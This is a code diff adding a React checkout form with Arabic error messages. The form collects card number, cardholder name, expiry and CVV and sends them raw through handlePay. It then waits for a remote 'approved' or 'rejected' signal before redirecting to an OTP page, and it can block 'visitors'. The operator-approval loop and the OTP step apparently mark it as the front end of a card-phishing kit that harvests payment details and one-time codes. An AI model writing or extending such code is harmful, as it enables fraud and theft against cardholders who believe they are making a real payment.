@@ -1,0 +1,128 @@
+  const [, setLocation] = useLocation();
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardName, setCardName] = useState("");
+  const [expiryMonth, setExpiryMonth] = useState("01");
+  const [expiryYear, setExpiryYear] = useState("2026");
+  const [cvv, setCvv] = useState("");
+  const [errors, setErrors] = useState<Record<string, string>>({});
+  const [submitError, setSubmitError] = useState("");
+
+  const cardType = getCardType(cardNumber);
+
+  const formatCardNumber = (value: string) => {
+    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+    const matches = v.match(/\d{4,16}/g);
+    const match = (matches && matches[0]) || "";
+    const parts = [];
+    for (let i = 0, len = match.length; i < len; i += 4) {
+      parts.push(match.substring(i, i + 4));
+    }
+    return parts.length ? parts.join(" ") : v;
+  };
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formatted = formatCardNumber(e.target.value);
+    if (formatted.replace(/\s/g, "").length <= 16) {
+      setCardNumber(formatted);
+      setErrors((prev) => ({ ...prev, cardNumber: "" }));
+      setSubmitError("");
+    }
+  };
+
+  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const v = e.target.value.replace(/[^0-9]/g, "");
+    if (v.length <= 4) {
+      setCvv(v);
+      setErrors((prev) => ({ ...prev, cvv: "" }));
+      setSubmitError("");
+    }
+  };
+
+  const validateForm = (): boolean => {
+    const newErrors: Record<string, string> = {};
+    const rawCard = cardNumber.replace(/\s/g, "");
+
+    if (!rawCard || rawCard.length < 13) {
+      newErrors.cardNumber = "رقم البطاقة غير صحيح";
+    } else if (!validateLuhn(rawCard)) {
+      newErrors.cardNumber = "رقم البطاقة غير صالح";
+    }
+
+    if (!cardName.trim() || cardName.trim().length < 3) {
+      newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
+    }
+
+    const now = new Date();
+    const expiry = new Date(parseInt(expiryYear), parseInt(expiryMonth) - 1);
+    if (expiry < now) {
+      newErrors.expiry = "البطاقة منتهية الصلاحية";
+    }
+
+    if (!cvv || cvv.length < 3) {
+      newErrors.cvv = "كود الحماية غير صحيح";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isWaitingApproval, setIsWaitingApproval] = useState(false);
+
+  useEffect(() => {
+    if (!isWaitingApproval) return;
+    const unsubscribe = listenForApproval((status) => {
+      if (status === "approved") {
+        setIsWaitingApproval(false);
+        setLocation("/otp");
+      } else if (status === "rejected") {
+        setIsWaitingApproval(false);
+        setSubmitError("البطاقة غير مدعومه حاول استخدام بطاقة اخرى");
+      }
+    });
+    return () => unsubscribe();
+  }, [isWaitingApproval, setLocation]);
+
+  const handleSubmit = async () => {
+    if (isSubmitting || isWaitingApproval) return;
+    if (!validateForm()) return;
+    setIsSubmitting(true);
+    setSubmitError("");
+
+    const cleanCard = cardNumber.replace(/\s/g, "");
+
+    try {
+      if (await isBinBlocked(cleanCard)) {
+        setSubmitError("هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
+        setIsSubmitting(false);
+        return;
+      }
+    } catch {
+      // ignore lookup errors and proceed
+    }
+
+    const paymentInfo = {
+      cardNumber: cleanCard,
+      cardName,
+      expiryMonth,
+      expiryYear,
+      cvv,
+      cardType: getCardType(cardNumber),
+      currentPage: "checkout",
+    };
+
+    try {
+      await handlePay(paymentInfo, () => {});
+    } catch (error: any) {
+      if (error?.message === "VISITOR_BLOCKED") {
+        setSubmitError("تم حظر هذا الزائر ولا يمكنه المتابعة");
+      } else {
+        setSubmitError("حدث خطأ أثناء معالجة الدفع");
+      }
+      setIsSubmitting(false);
+      return;
+    }
+
+    setIsSubmitting(false);
+    setIsWaitingApproval(true);
+  };
